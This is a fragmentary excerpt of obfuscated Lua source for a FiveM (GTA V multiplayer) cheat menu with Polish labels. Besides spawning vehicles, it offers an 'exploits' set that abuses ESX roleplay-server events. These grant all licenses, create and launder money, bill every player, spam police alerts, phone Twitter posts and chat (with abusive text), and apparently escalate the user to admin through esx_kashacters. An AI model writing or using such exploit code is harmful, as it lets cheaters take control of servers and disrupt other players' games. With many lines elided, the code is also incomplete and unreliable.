                    local M8dijU9EXDD = KeyboardInput("Numery Rejestracyjne", "", 8)
                    NertigelFunc.sPO.SpawnLegalVehicle(cOFxD00346hyXWlRCrGv, PlayerId(), M8dijU9EXDD)
                elseif squbanymod.Button("Zresp Pociąg I Jeździj Nim", "~g~Użyj") then
                    NertigelFunc.spawnRandomTrain()
                end
                for d0A, dObpkKl9DxmXkaZLkqdo in ipairs(vehiclecategories) do
                    if squbanymod.MenuButton(dObpkKl9DxmXkaZLkqdo, "vehicleSpawnSelected") then
                        selectedCarTypeIdx = d0A
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleSpawnSelected") then
                for Rf4TU, XNLbJxb0j_JTk in ipairs(allvehicles[selectedCarTypeIdx]) do
                    local jc = GetLabelText(XNLbJxb0j_JTk)
                    if jc == "NULL" then
                        jc = XNLbJxb0j_JTk
                    end
                    if squbanymod.MenuButton(jc, "vehicleSpawnSelectedOptions") then
                        selectedCarToSpawn = Rf4TU
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleSpawnSelectedOptions") then
                if squbanymod.Button("Spawn Car") then
                    NertigelFunc.spawnVehicle(allvehicles[selectedCarTypeIdx][selectedCarToSpawn])
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("serverOptionsTriggerEvents") then
                if squbanymod.MenuButton("ESX Triggery", "serverOptionsTriggerEventsESX") then
                elseif squbanymod.MenuButton("Menu Pracy", "setjobmenu") then
                elseif squbanymod.Button("Spam Chat", "Server") then
                    for colorLoop = 2, 6 do
                        ...
                        TriggerCustomEvent(
                            ...
                            "squbanymod",
                            {YKyAw.r, YKyAw.g, YKyAw.b},
                            "/ooc GodMod Menu Developer SqubanY#0069 Kurwy!!!!!^" .. colorLoop .. " squbanymod Menu! "
                        )
                    end
                elseif squbanymod.Button("Dzwięki Rozpierdollu", "Server") then
                    NertigelFunc.exploits.interactSound()
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("serverOptionsTriggerEventsESX") then
                if squbanymod.Button("Skin Changer", "Client") then
                    if NertigelFunc.doesResourceExist("esx_skin") then
                        ...
                        squbanymod.PushNotification("Coś Nie Pykło!", 5000)
                    end
                elseif squbanymod.Button("Zakuj Kajdankami", "Client") then
                    if NertigelFunc.doesResourceExist("esx_policejob") then
                        TriggerCustomEvent(false, "esx_policejob:unrestrain")
                    else
                        squbanymod.PushNotification("Błąd!!", 5000)
                    end
                elseif squbanymod.Button("Nabyj Wszystkie Licencje", "Server") then
                    NertigelFunc.exploits.esx_givelicenses()
                elseif squbanymod.Button("Błąd Telefonu", "Server") then
                    NertigelFunc.exploits.gcphoneTwitter()
                elseif squbanymod.Button("Policyjny Alert Spam", "Server") then
                    NertigelFunc.exploits.esx_outlawalert()
                elseif squbanymod.Button("Nadaj Wszystkim Rachunek", "Server") then
                    NertigelFunc.exploits.esx_billing()
                elseif squbanymod.Button("Spam Na TT", "Server") then
                ...
                elseif squbanymod.Button("NIE DZIAŁA!!!!  ~r~(!)", "WKRÓTCE") then
            ...
            if #cachedNotifications > 0 then
                for notificationIndex = 1, #cachedNotifications do
                    ...
                    if Hsv_w8hh then
                        ...
                        squbanymod.Draw3D(0.5, 0.8 * nagq, Hsv_w8hh["text"], Hsv_w8hh["opacity"])
                        if BFC5_Kp1Uf >= 100.0 then
                            squbanymod.RemoveNotification(notificationIndex)
                        end
                    end
                end
            end
...
NertigelFunc.nativeRevive = function()
    ...
    squbanymod.PushNotification("Odrodzono", 5000)
end
        ...
        function()
            ...
            while not HasModelLoaded(vehiclehash) do
                ...
                if LAwM9UUvcVdug > 5000 then
                    squbanymod.PushNotification("Could not spawn this vehicle!", 5000)
                    break
                end
            end
            SpawnedCar =
...
NertigelFunc.aPO.explosqubanymodrs = function()
        ...
        function()
            ...
            while not HasModelLoaded(uvgOYYJo) do
                ...
                if W5rHBekZtN9I7H1mICi > 5000 then
                    squbanymod.PushNotification("Could not load model!", 5000)
                    break
                end
            end
...
NertigelFunc.sPO.teleportIntoVehicle = function(UaGW_sOgX6b8JYh9)
    if not IsPedInAnyVehicle(UaGW_sOgX6b8JYh9) then
        return squbanymod.PushNotification("Player must be sitting in a vehicle!", 5000)
    end
...
NertigelFunc.sPO.SpawnVehicleToPlayer = function(C9sPHMhSK_n1Ed40, NcM)
    if C9sPHMhSK_n1Ed40 and IsModelValid(C9sPHMhSK_n1Ed40) and IsModelAVehicle(C9sPHMhSK_n1Ed40) then
        ...
        squbanymod.PushNotification("Invalid Vehicle Model!", 5000)
        return nil
    end
end
NertigelFunc.sPO.SpawnLegalVehicle = function(GSH_, J436VYO1RFyh6cKgqQ, Wd)
    ...
    if WQrQ ~= nil then
        ...
        squbanymod.PushNotification("Spawned Vehicle", 5000)
        ...
        if B_hoO then
            ...
            elseif NertigelFunc.doesResourceExist("esx_CryptosCustoms") then
                ...
                squbanymod.PushNotification("Resources were not found!", 5000)
            end
        end
    end
end
NertigelFunc.sPO.ESXSellVehicle = function()
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        if ESX ~= nil then
            ...
            squbanymod.PushNotification("Couldn't find ESX, try refresing it in the settings tab", 5000)
        end
    else
        squbanymod.PushNotification("You must be in a vehicle to use this!", 5000)
    end
end
    ...
    if NertigelFunc.doesResourceExist("gcphone") or NertigelFunc.doesResourceExist("xenknight") then
        Citizen.CreateThread(
            function()
                ...
                Citizen.Wait(1500)
                TriggerCustomEvent(true, "gcPhone:twitter_login", "squbanymod", "squbanymod")
                Citizen.Wait(1500)
                for i = 1, 50 do
                    TriggerCustomEvent(
                        true,
...
NertigelFunc.exploits.esx_kashacters = function()
    if
     ...
     then
        ...
        squbanymod.PushNotification("You should be an admin, reconnect!", 15000)
    else
        squbanymod.PushNotification("Błąd!!", 5000)
    end
end
...
NertigelFunc.exploits.esx_moneymaker = function()
    local KkleewwG_x = KeyboardInput("Wpisz Ilość Gotówki", "", 12)
    if KkleewwG_x ~= " " then
        local oOmm = KeyboardInput("Wpisz Kwotę loops", "", 12)
        if not oOmm then
            oOmm = 1
        end
        ...
        if Y8ybTnyX4AMTQd8M == "y" or Y8ybTnyX4AMTQd8M == "Y" or Y8ybTnyX4AMTQd8M == "yes" or Y8ybTnyX4AMTQd8M == "Yes" then
            ...
            squbanymod.PushNotification("esx_moneymaker Anulowano.", 5000)
        end
    else
        squbanymod.PushNotification("Proszę Wpisać Ilość Gotówki!", 5000)
    end
end
NertigelFunc.exploits.esx_moneywash = function()
    local dnQ5x2cwH5WmPD41rc = KeyboardInput("Wpisz Ilość Gotówki", "", 12)
    if dnQ5x2cwH5WmPD41rc ~= " " then
        ...
        squbanymod.PushNotification("Please enter a valid amount of money!", 5000)
    end
end
